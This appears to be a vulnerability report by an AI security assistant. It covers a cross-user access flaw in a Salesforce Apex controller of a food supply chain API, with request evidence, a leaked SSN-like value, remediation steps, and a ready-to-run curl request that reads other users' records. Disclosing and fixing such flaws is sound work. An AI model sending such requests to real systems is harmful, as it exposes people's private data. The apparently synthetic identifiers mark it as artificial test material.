# Security Analysis Report
**System:** TraceOrigin Supply API (Food & Beverage / FMCG) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0029 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.5 | Multi-tenant cross-user access — `OpportunityController.getOpportunity` without ownership check exposes cross-user supply chain records |

---

## Finding 1 — Cross-User Supply Chain Opportunity Access (CRITICAL)

### Summary
The `OpportunityController` Apex class on TraceOrigin Supply API (`ef35c41b.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Opportunity records. Per §5.0 Pattern 1.5, the `getOpportunity` action enables multi-tenant cross-user access: with no ownership validation, any valid session holder can access supply chain opportunity records owned by other users by substituting `opportunityId: "001C41B"`.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://ef35c41b.lightning.force.com/aura`

### Evidence from HAR
**Request:**
```
POST https://ef35c41b.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00DEF35C41B!ARef35c41b...
message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","params":{"opportunityId":"001C41B","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response:** `OwnerId: 005VICTIM`, `SensitiveData__c: SSN: 000-36-1281`

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD bypassed |
| §5.0 Pattern 1.5 | Vulnerability | Multi-tenant cross-user access | Classification |
| HAR descriptor | `c.OpportunityController.getOpportunity` | Aura action | Entry point |
| HAR params | `opportunityId` | `001C41B` | Victim supply chain record |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-36-1281` | Supply chain operator PII |

### Steps to Reproduce
```bash
curl -s -X POST "https://ef35c41b.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DEF35C41B!ARef35c41b..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"001C41B","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```

### Remediation
1. `public with sharing class OpportunityController {`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields` parameter; server-side allowlist.
4. Validate `aura.token`. Food supply chain data is regulated — traceability records subject to food safety regulations.
